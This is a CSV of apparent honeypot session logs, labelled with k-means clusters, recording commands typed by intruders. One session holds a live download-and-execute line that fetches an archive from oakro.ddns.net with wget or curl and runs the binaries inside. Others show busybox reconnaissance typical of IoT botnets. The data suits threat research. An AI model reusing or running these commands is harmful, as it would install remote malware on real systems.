session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
5cdead6ae593,2,0,3.456379652023315,2,uname -a
5cdead6ae593,2,1,3.456379652023315,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget oakro.ddns.net/ssh || curl -o ssh oakro.ddns.net/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 1qaz@WSX
329191b151b8,0,2,10.134948492050173,13,enable
329191b151b8,0,3,10.134948492050173,13,system
329191b151b8,0,4,10.134948492050173,13,system
329191b151b8,0,5,10.134948492050173,13,shell
329191b151b8,0,6,10.134948492050173,13,shell
329191b151b8,0,7,10.134948492050173,13,sh
329191b151b8,0,8,10.134948492050173,13,cat /proc/mounts; /bin/busybox ZLMBN
329191b151b8,0,9,10.134948492050173,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZLMBN
329191b151b8,0,10,10.134948492050173,13,tftp; wget; /bin/busybox ZLMBN
329191b151b8,0,11,10.134948492050173,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
329191b151b8,0,12,10.134948492050173,13,while read i
329191b151b8,0,13,10.134948492050173,13,/bin/busybox ZLMBN
329191b151b8,0,14,10.134948492050173,13,rm .s; exit
d4769f89c00b,3,15,1.182728290557861,1,uname -s -v -n -r -m
d8223e6f5bc4,0,16,3.211135625839233,13,enable
d8223e6f5bc4,0,17,3.211135625839233,13,system
d8223e6f5bc4,0,18,3.211135625839233,13,system
d8223e6f5bc4,0,19,3.211135625839233,13,shell
d8223e6f5bc4,0,20,3.211135625839233,13,shell
d8223e6f5bc4,0,21,3.211135625839233,13,sh
d8223e6f5bc4,0,22,3.211135625839233,13,cat /proc/mounts; /bin/busybox ELJWS
d8223e6f5bc4,0,23,3.211135625839233,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ELJWS
d8223e6f5bc4,0,24,3.211135625839233,13,tftp; wget; /bin/busybox ELJWS
d8223e6f5bc4,0,25,3.211135625839233,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d8223e6f5bc4,0,26,3.211135625839233,13,while read i
d8223e6f5bc4,0,27,3.211135625839233,13,/bin/busybox ELJWS
